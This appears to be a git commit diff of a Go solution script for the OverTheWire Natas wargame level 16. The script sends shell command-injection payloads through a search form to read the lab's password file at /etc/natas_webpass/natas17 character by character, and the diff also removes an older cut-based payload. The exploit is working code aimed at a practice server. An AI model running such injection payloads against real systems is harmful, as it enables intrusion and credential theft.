7998c45807eee8cdecb096268ab3a4a591475505
Prajjwal <prajjwalverma74@gmail.com>
2024-08-16 00:33:22 +0530

    natas17 solution

--- main.go
+++ main.go
@@ -6,20 +6,24 @@ import (
 	"log"
 	"net/http"
 	"net/url"
+	"regexp"
 	"strings"
+
 	"github.com/PuerkitoBio/goquery"
 )
 
 const (
 	formurl    = "http://natas16.natas.labs.overthewire.org/"
+	characters = "eEqQJjhHBboOlLfFnNvVwW9sS87kK0tT5cC"
 )
 
 func main() {
 	formData := url.Values{}
 	password := ""
-	pos := 1
-	for pos < 33 {
-			payload := `$(cut -c ` + fmt.Sprint(pos) + ` /etc/natas_webpass/natas17)`
+	reg := regexp.MustCompile("zigzag")
+	for len(password) < 32 {
+		for _, a := range characters {
+			payload := `$(grep ` + password + string(a) + ` /etc/natas_webpass/natas17)zigzag`
 			formData.Set("needle", payload)
 			formData.Set("submit", "Search")
 
@@ -48,48 +52,12 @@ func main() {
 				log.Fatalf("Failed to parse html")
 			}
 			doc.Find("pre").Each(func(i int, s *goquery.Selection) {
-				if len(s.Text()) != 0 {
-				password += guess(s.Text())
-//				fmt.Println(s.Text())
-} else { password += "(" }
+				if !reg.MatchString(s.Text()) {
+					password += string(a)
 				fmt.Printf("%s\n",password)
+				}
 			})
-			
-			pos += 1
+		}
 	}
 }
 
-func guess(s string) string {
-	guess_set := ""
-	//GuessSet finding
-	for _, i := range s {
-		if i == '\n' {
-			break
-		}
-		guess_set += string(i)
-	}
-
-	fmt.Println(guess_set)
-
-	for _, a := range guess_set {
-		statusChar := 1
-		status := 0
-		for _, b := range s {
-			if b == '\n' && status == 0 {
-				statusChar = 0
-				break
-			} else if b == '\n' && status == 1 {
-				status = 0
-				continue
-			} else if strings.ToLower(string(b)) == strings.ToLower(string(a)) {
-				status = 1 
-			}
-		}
-		if statusChar == 1 {
-			return string(a)
-		}
-	}
-
-
-	return ""
-}
